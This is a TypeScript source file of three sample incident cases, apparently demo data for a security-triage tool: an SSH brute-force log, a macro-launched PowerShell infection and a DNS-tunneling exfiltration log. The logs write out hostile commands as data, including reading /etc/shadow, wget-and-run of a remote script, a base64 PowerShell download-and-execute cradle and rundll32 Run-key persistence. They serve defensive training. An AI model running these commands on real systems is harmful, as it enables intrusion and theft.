import type { ArtifactKind } from "@workspace/api-client-react";

export interface SampleArtifact {
  kind: ArtifactKind;
  filename: string;
  content: string;
}

export interface SampleCase {
  id: string;
  title: string;
  shortLabel: string;
  scenario: string;
  description: string;
  artifacts: SampleArtifact[];
}

const sshBruteForceLog = `2026-05-17T03:14:02Z sshd[18421]: Failed password for invalid user admin from 185.220.101.47 port 49812 ssh2
2026-05-17T03:14:03Z sshd[18421]: Failed password for invalid user admin from 185.220.101.47 port 49812 ssh2
2026-05-17T03:14:05Z sshd[18421]: Failed password for invalid user root from 185.220.101.47 port 49814 ssh2
2026-05-17T03:14:06Z sshd[18421]: Failed password for invalid user root from 185.220.101.47 port 49814 ssh2
2026-05-17T03:14:08Z sshd[18421]: Failed password for invalid user postgres from 185.220.101.47 port 49820 ssh2
2026-05-17T03:14:11Z sshd[18421]: Failed password for invalid user oracle from 185.220.101.47 port 49826 ssh2
2026-05-17T03:14:13Z sshd[18421]: Failed password for invalid user jenkins from 185.220.101.47 port 49830 ssh2
2026-05-17T03:14:15Z sshd[18421]: Failed password for invalid user git from 185.220.101.47 port 49834 ssh2
2026-05-17T03:14:18Z sshd[18421]: Failed password for invalid user ubuntu from 185.220.101.47 port 49840 ssh2
2026-05-17T03:14:21Z sshd[18421]: Failed password for invalid user ec2-user from 185.220.101.47 port 49844 ssh2
2026-05-17T03:14:24Z sshd[18421]: Failed password for invalid user devops from 185.220.101.47 port 49850 ssh2
2026-05-17T03:14:27Z sshd[18421]: Failed password for invalid user test from 185.220.101.47 port 49854 ssh2
2026-05-17T03:14:31Z sshd[18421]: Failed password for invalid user backup from 185.220.101.47 port 49860 ssh2
2026-05-17T03:14:34Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49866 ssh2
2026-05-17T03:14:37Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49870 ssh2
2026-05-17T03:14:40Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49874 ssh2
2026-05-17T03:14:43Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49878 ssh2
2026-05-17T03:14:46Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49882 ssh2
2026-05-17T03:14:49Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49886 ssh2
2026-05-17T03:14:52Z sshd[18421]: Accepted password for deploy from 185.220.101.47 port 49890 ssh2
2026-05-17T03:14:52Z sshd[18421]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
2026-05-17T03:15:04Z sudo[18512]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
2026-05-17T03:15:18Z sudo[18519]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.47:8080/k.sh -O /tmp/.k
2026-05-17T03:15:22Z sudo[18524]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.k
2026-05-17T03:15:25Z sshd[18421]: pam_unix(sshd:session): session closed for user deploy
`;

const sshAuthContext = `Host: web-prod-02 (10.0.4.21)
OS: Ubuntu 22.04 LTS
Service: OpenSSH_8.9p1
Exposed: yes (port 22 open to 0.0.0.0/0)
Fail2ban: disabled
MFA on SSH: not configured
Known good users: deploy, ubuntu, root (key-only — password auth was supposed to be off)
Note: a config push at 2026-05-17T02:50Z accidentally re-enabled PasswordAuthentication.
`;

const powershellAttackLog = `2026-05-18T11:02:14Z WIN-FIN-07 Microsoft-Windows-PowerShell/Operational EventID=4104
ScriptBlockText:
$ErrorActionPreference='SilentlyContinue'
IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRjLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vNDUuMzMuMzIuMTU2L2EucHMxIikgfCBJRVg=')))

2026-05-18T11:02:14Z WIN-FIN-07 Microsoft-Windows-PowerShell/Operational EventID=4104
ScriptBlockText:
$c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX

2026-05-18T11:02:15Z WIN-FIN-07 Sysmon EventID=3 (Network connect)
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: CORP\\jhamilton
DestinationIp: 45.33.32.156
DestinationPort: 80
DestinationHostname: -

2026-05-18T11:02:18Z WIN-FIN-07 Sysmon EventID=1 (Process create)
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwA0ADUALgAzADMALgAzADIALgAxADUANgAvAGwALgBkAGwAbAA=
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\jhamilton\\Downloads\\Q2_Revenue_Forecast.docm"

2026-05-18T11:02:21Z WIN-FIN-07 Sysmon EventID=11 (File create)
TargetFilename: C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll

2026-05-18T11:02:23Z WIN-FIN-07 Sysmon EventID=1 (Process create)
Image: C:\\Windows\\System32\\rundll32.exe
CommandLine: rundll32.exe C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll,EntryPoint
ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

2026-05-18T11:02:25Z WIN-FIN-07 Sysmon EventID=13 (Registry value set)
TargetObject: HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync
Details: rundll32.exe C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll,EntryPoint
`;

const powershellEndpointContext = `Endpoint: WIN-FIN-07
User: jhamilton (Finance — Senior Analyst)
EDR: Defender for Endpoint (real-time protection ON)
Last known good baseline: 2026-05-17T22:00Z

Note: User reported clicking through a "macro warning" on a Word doc emailed
from "cfo-office@corp-fіnance.com" (Cyrillic 'і' in 'finance') at ~11:01 local time.
Decoded base64 payload (first block): $c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX
`;

const dnsExfilLog = `# bind9 query log — internal resolver ns1.corp.local
2026-05-18T22:11:03Z client 10.0.7.84#52341 (a7f3.k29bm9p1q8s.exfil-gateway.com): query: a7f3.k29bm9p1q8s.exfil-gateway.com IN TXT
2026-05-18T22:11:03Z client 10.0.7.84#52342 (b9e1.j8nz4xw0v7r.exfil-gateway.com): query: b9e1.j8nz4xw0v7r.exfil-gateway.com IN TXT
2026-05-18T22:11:04Z client 10.0.7.84#52343 (c4d8.h6mk3yqe2lf.exfil-gateway.com): query: c4d8.h6mk3yqe2lf.exfil-gateway.com IN TXT
2026-05-18T22:11:04Z client 10.0.7.84#52344 (d2a9.g5lw1zsd4kj.exfil-gateway.com): query: d2a9.g5lw1zsd4kj.exfil-gateway.com IN TXT
2026-05-18T22:11:05Z client 10.0.7.84#52345 (e8b2.f4kr8ats7nh.exfil-gateway.com): query: e8b2.f4kr8ats7nh.exfil-gateway.com IN TXT
2026-05-18T22:11:05Z client 10.0.7.84#52346 (f1c5.e3jv6bru9md.exfil-gateway.com): query: f1c5.e3jv6bru9md.exfil-gateway.com IN TXT
2026-05-18T22:11:06Z client 10.0.7.84#52347 (g7d6.d2it5csa1pb.exfil-gateway.com): query: g7d6.d2it5csa1pb.exfil-gateway.com IN TXT
2026-05-18T22:11:06Z client 10.0.7.84#52348 (h3e9.c1hs4dty0qc.exfil-gateway.com): query: h3e9.c1hs4dty0qc.exfil-gateway.com IN TXT
2026-05-18T22:11:07Z client 10.0.7.84#52349 (i6f4.b0gr3euz9xv.exfil-gateway.com): query: i6f4.b0gr3euz9xv.exfil-gateway.com IN TXT
2026-05-18T22:11:07Z client 10.0.7.84#52350 (j9g2.a9fq2fvy8wn.exfil-gateway.com): query: j9g2.a9fq2fvy8wn.exfil-gateway.com IN TXT
... 4,812 similar TXT queries to *.exfil-gateway.com between 22:11:03 and 22:23:47 ...
2026-05-18T22:23:47Z client 10.0.7.84#56102 (END.0000.exfil-gateway.com): query: END.0000.exfil-gateway.com IN TXT
2026-05-18T22:23:47Z client 10.0.7.84#56103 (END.0001.exfil-gateway.com): query: END.0001.exfil-gateway.com IN TXT
Total queries to *.exfil-gateway.com (last 30 min): 4814
Unique subdomains: 4812
Average subdomain length: 48 chars
Mean inter-query interval: 0.156s
`;

const dnsHostContext = `Source host: 10.0.7.84 — DB-REPLICA-03 (PostgreSQL read replica, prod customer DB)
Owner: Data Platform team
Outbound policy: should ONLY talk to 10.0.0.0/8 + internal NTP/DNS
Egress firewall: permits UDP/53 to internal resolver only (ns1.corp.local)
ns1.corp.local: recursive resolver — forwards external lookups to 8.8.8.8
exfil-gateway.com: registered 2026-05-12 via Namecheap, NS records on cloudflare
No business reason for this host to query exfil-gateway.com
`;

export const SAMPLE_CASES: SampleCase[] = [
  {
    id: "ssh-bruteforce-breakthrough",
    shortLabel: "SSH Brute Force → Breach",
    title: "SSH brute force with successful breakthrough on web-prod-02",
    scenario: "Credential attack",
    description:
      "Fail2ban alerts flagged 19 failed SSH logins from 185.220.101.47 against web-prod-02 over a ~50 second window, followed by a successful login as the 'deploy' service account. Within 30 seconds the session read /etc/shadow and pulled a remote shell script to /tmp. Determine whether the host is compromised, scope the blast radius, and recommend containment.",
    artifacts: [
      { kind: "log_file", filename: "auth.log", content: sshBruteForceLog },
      { kind: "text", filename: "host_context.md", content: sshAuthContext },
    ],
  },
  {
    id: "powershell-encoded-payload",
    shortLabel: "Encoded PowerShell",
    title: "Suspicious encoded PowerShell launched from Word macro on WIN-FIN-07",
    scenario: "Malware / phishing",
    description:
      "Defender flagged an encoded PowerShell command line spawned by WINWORD.EXE on a finance workstation. The macro originated from a lookalike sender domain (Cyrillic homoglyph in 'finance'). A DLL was dropped to %AppData% and a Run key was added for persistence. Decode the payload, determine intent, and recommend response.",
    artifacts: [
      { kind: "log_file", filename: "powershell_sysmon.log", content: powershellAttackLog },
      { kind: "text", filename: "endpoint_context.md", content: powershellEndpointContext },
    ],
  },
  {
    id: "dns-data-exfiltration",
    shortLabel: "DNS Data Exfiltration",
    title: "Suspected DNS tunneling exfiltration from DB-REPLICA-03",
    scenario: "Data exfiltration",
    description:
      "Internal DNS resolver logged 4,800+ TXT queries to *.exfil-gateway.com from a production DB read replica in 12 minutes. Subdomains are high-entropy and ~48 chars long. The host has no business reason to talk to that domain. Determine whether this is DNS tunneling exfil, identify the channel, and recommend containment.",
    artifacts: [
      { kind: "network_capture", filename: "bind9_query.log", content: dnsExfilLog },
      { kind: "text", filename: "host_context.md", content: dnsHostContext },
    ],
  },
];
